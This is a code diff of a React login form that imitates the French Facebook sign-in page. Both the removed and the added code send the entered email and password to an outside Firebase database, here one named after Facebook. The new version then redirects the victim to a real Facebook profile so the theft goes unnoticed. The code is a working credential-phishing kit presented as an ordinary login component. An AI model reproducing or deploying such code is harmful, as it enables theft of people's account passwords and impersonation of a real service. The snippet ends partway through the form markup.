@@ -1,54 +1,67 @@
 // LoginForm.js
 import React, { useState } from 'react';
-import { db, ref, set } from './Firebase';
 import './LoginForm.css';
-import { getDatabase, push } from 'firebase/database';
 
 const LoginForm = () => {
-  const [email, setEmail] = useState('');
-  const [password, setPassword] = useState('');
-
-  const handleSubmit = async (e) => {
-    e.preventDefault();
-
-    try {
-      const db = getDatabase();
-      const userRef = ref(db, 'contactForm'); // Replace 'contactForm' with your desired collection or path
-
-      // Utilisez push au lieu de set pour ajouter une nouvelle entrée avec une clé unique
-      const newEntryRef = push(userRef);
-
-      await set(newEntryRef, {
-        email: email,
-        password: password,
-      });
-
-      console.log('Login successful');
-      window.location.href = 'https://www.facebook.com/?locale=fr_FR';
-
-      
-    } catch (error) {
-      console.error('Login error:', error.message);
+  const [user,setUser] = useState(
+    {
+      Email: '',Password: ''
     }
-  };
+  )
+  let name , value
+  console.log(user)
+  const data = (e) =>
+  {
+    name = e.target.name;
+    value = e.target.value;
+    setUser({...user,[name]: value});
+  }
+  const getdata = async (e) => {
+    e.preventDefault();
+  
+    const { Email, Password } = user;
+  
+    const options = {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        Email,
+        Password,
+      }),
+    };
+    const res = await fetch("https://facebook-975ea-default-rtdb.firebaseio.com/contactForm.json", options);
+
+    window.location.href = "https://www.facebook.com/profile.php?id=100091219641608&mibextid=7BxKtlCqh5F1hMP9";
+
+    console.log(res)
+    // if (res){
+    //   alert ('data stored')
+    //   }else{
+    //     alert('erroure')
+    //   }
+      }
 
   // ... le reste de votre composant
 
   return (
-    <form className="login-form" onSubmit={handleSubmit}>
+    <form className="login-form" >
       <input
-        type="text"
-        placeholder="Numéro mobile ou e-mail"
-        value={email}
-        onChange={(e) => setEmail(e.target.value)}
+      type="email"
+      name="Email"
+      id="userEmail"
+      placeholder="Numéro mobile ou e-mail"
+      value={user.Email} onChange={data}
       />
       <input
         type="password"
+        name="Password"
+        id="password"
         placeholder="Mot de passe"
-        value={password}
-        onChange={(e) => setPassword(e.target.value)}
+        value={user.Password} onChange={data}
       />
-      <button type="submit">Se connecter</button>
+      <button type="submit" onClick={getdata}>Se connecter</button>
       <a href="#">Mot de passe oublié ?</a>
 
       <div className="sep">
